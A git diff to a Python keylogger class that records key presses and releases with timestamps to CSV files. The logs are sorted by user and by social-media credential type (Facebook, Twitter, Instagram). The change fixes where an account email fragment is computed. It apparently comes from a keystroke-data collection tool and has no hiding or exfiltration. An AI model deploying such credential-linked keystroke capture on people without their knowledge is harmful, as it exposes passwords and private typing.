@@ -31,7 +31,9 @@ from base.displayer import (
 from base.csv_writer import CSVWriter
 from initalizer import LOGS_DIR
 from pathlib import Path
+from rich.traceback import install
 
+install()
 # TODO: Write csv headers to each generated file
 SHUTDOWN = [
     {keyboard.Key.ctrl, keyboard.KeyCode(char="a")},
@@ -255,11 +257,11 @@ class Keylogger:
                         os.path.join(LOGS_DIR, self.user_id, self.user_id + ".csv"),
                         data,
                     )
+
+                elif platform_type == CredentialType.FACEBOOK:
                     account_email_fragment = account_number_to_email_fragment(
                         account_number
                     )
-                elif platform_type == CredentialType.FACEBOOK:
-
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
@@ -274,6 +276,9 @@ class Keylogger:
                         data,
                     )
                 elif platform_type == CredentialType.TWITTER:
+                    account_email_fragment = account_number_to_email_fragment(
+                        account_number
+                    )
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
@@ -288,6 +293,9 @@ class Keylogger:
                         data,
                     )
                 elif platform_type == CredentialType.INSTAGRAM:
+                    account_email_fragment = account_number_to_email_fragment(
+                        account_number
+                    )
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
@@ -308,17 +316,17 @@ class Keylogger:
                 # _        self.__hotkey_shutdown()
 
             def on_release(key) -> None:
-                if platform_type is None:
+                if platform_type is None or account_number is None:
                     self.buffer_write(f"R,{override_key(key)}, {time.time()}")
                     data = ["R", override_key(key), time.time()]
                     self.csv_writer.write_data_to_csv(
                         os.path.join(LOGS_DIR, self.user_id, self.user_id + ".csv"),
                         data,
                     )
+                elif platform_type == CredentialType.FACEBOOK:
                     account_email_fragment = account_number_to_email_fragment(
                         account_number
                     )
-                elif platform_type == CredentialType.FACEBOOK:
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
@@ -333,6 +341,9 @@ class Keylogger:
                         data,
                     )
                 elif platform_type == CredentialType.TWITTER:
+                    account_email_fragment = account_number_to_email_fragment(
+                        account_number
+                    )
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
@@ -347,6 +358,9 @@ class Keylogger:
                         data,
                     )
                 elif platform_type == CredentialType.INSTAGRAM:
+                    account_email_fragment = account_number_to_email_fragment(
+                        account_number
+                    )
                     _social_platform_path = os.path.join(
                         LOGS_DIR,
                         self.user_id,
